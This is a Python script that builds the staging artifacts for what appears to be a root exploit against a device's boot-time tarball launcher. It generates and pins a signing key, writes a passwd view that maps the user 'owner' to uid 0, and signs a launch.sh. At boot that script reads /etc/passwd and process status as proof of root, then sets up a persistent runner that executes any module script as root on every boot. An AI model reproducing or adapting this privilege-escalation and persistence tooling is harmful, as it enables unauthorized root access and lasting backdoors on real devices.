#!/usr/bin/env python3
"""Build the boot agent's staging artifacts.

Generates the RSA keypair for the signed launch script archive (pinned to
./out/pinned-private.pem so re-runs do not invalidate previously staged
signatures), the passwd bind view, and the signed launch.sh tarball that
sdbd-tarlauncher executes at boot.

All artifacts land in ./out/ — nothing is written outside this directory.
"""
import io, os, subprocess, tarfile, tempfile

PKG = "archive-root-00b0000000000001"  # 16 hex chars after the prefix
assert len(PKG) == len("archive-root-") + 16
assert all(c in "0123456789abcdef" for c in PKG[len("archive-root-"):])

OUT = os.path.join(os.path.dirname(os.path.abspath(__file__)), "out")
os.makedirs(OUT, exist_ok=True)

LAUNCH_SH = """exec 2>&1
{
  echo "SELFROOT-PROOF uid=$(id -u) gid=$(id -g)"
  echo "---STATUS---"
  cat /proc/self/status
  echo "---PASSWD-VIEW---"
  cat /etc/passwd
  echo "---DONE---"
} > /tmp/selfroot-proof.txt
chsmack -a _ /tmp/selfroot-proof.txt 2>/dev/null

# module runner: persistent /opt modules, executed as root at every boot.
# Modules never need tar rebuilds; enable/disable via a 'disabled' flag file.
MODS=/opt/usr/share/selfroot/modules
EV=/home/owner/share/tmp/sdk_tools/selfroot-evidence
if [ -d "$MODS" ]; then
  mkdir -p "$EV" 2>/dev/null
  for m in "$MODS"/*/; do
    [ -d "$m" ] || continue
    mid=$(basename "$m")
    if [ -f "$m/disabled" ]; then
      echo "$(date) skip $mid (disabled)" >> "$EV/modules.log"
      continue
    fi
    [ -f "$m/boot.sh" ] || continue
    echo "$(date) run $mid" >> "$EV/modules.log"
    ( cd "$m" && cat "$m/boot.sh" | MODULE_DIR="$m" EVIDENCE="$EV" bash ) > "$EV/module-$mid.log" 2>&1
    echo "$(date) $mid exit=$?" >> "$EV/modules.log"
  done
fi
sleep 5
"""

def openssl(*args):
    subprocess.run(["openssl", *args], check=True, capture_output=True)

with tempfile.TemporaryDirectory() as td:
    priv = os.path.join(td, "private.pem")
    pub = os.path.join(td, "public.pem")
    pinned = os.path.join(OUT, "pinned-private.pem")
    if os.path.exists(pinned):
        import shutil; shutil.copy(pinned, priv)
    else:
        openssl("genpkey", "-algorithm", "RSA", "-pkeyopt", "rsa_keygen_bits:2048",
                "-out", priv)
        import shutil; shutil.copy(priv, pinned)
    openssl("pkey", "-in", priv, "-pubout", "-out", pub)
    # passwd view: owner maps to uid 0
    with open(os.path.join(td, "passwd"), "w") as f:
        f.write("owner:x:0:0:owner:/home/owner:/bin/sh\n")
    # archive with launch.sh member (mode 0600, mtime 0 — mirrors driver)
    archive = os.path.join(td, f"{PKG}.tar.gz")
    script = LAUNCH_SH.encode("ascii")
    with tarfile.open(archive, "w:gz") as out:
        m = tarfile.TarInfo("launch.sh")
        m.size = len(script)
        m.mode = 0o600
        m.mtime = 0
        out.addfile(m, io.BytesIO(script))
    sig = os.path.join(td, f"{PKG}.tar.gz.signature")
    openssl("dgst", "-sha256", "-sign", priv, "-out", sig, archive)
    # verify round-trip
    subprocess.run(["openssl", "dgst", "-sha256", "-verify", pub,
                    "-signature", sig, archive], check=True, capture_output=True)
    # ship
    for name, src in [("private.pem", priv), ("public.pem", pub),
                      ("passwd", os.path.join(td, "passwd")),
                      (f"{PKG}.tar.gz", archive),
                      (f"{PKG}.tar.gz.signature", sig)]:
        dst = os.path.join(OUT, name)
        with open(src, "rb") as f, open(dst, "wb") as g:
            g.write(f.read())
        print("wrote", dst)
print("PKG =", PKG)